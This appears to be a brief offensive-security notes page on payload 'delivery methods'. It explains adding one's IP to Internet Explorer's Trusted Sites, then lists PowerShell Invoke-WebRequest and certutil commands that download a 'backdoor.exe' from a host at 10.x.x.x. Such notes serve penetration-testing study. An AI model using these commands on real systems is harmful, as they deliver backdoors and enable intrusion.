# Delivery Methods
But first, go to Internet Explorer settings and choose "Internet Options".

![](Delivery%20Methods/1_image.png)

Click on the "Security" tab, select "Trusted Sites" and then click on the "Sites" button. Fill the "Add this website to the zone" field with your IP address and click the "Add" button.

![](Delivery%20Methods/2_image.png)

`Invoke-WebRequest http://10.x.x.x/backdoor.exe`  
`certutil -urlcache -split -f http://10.x.x.x/backdoor.exe`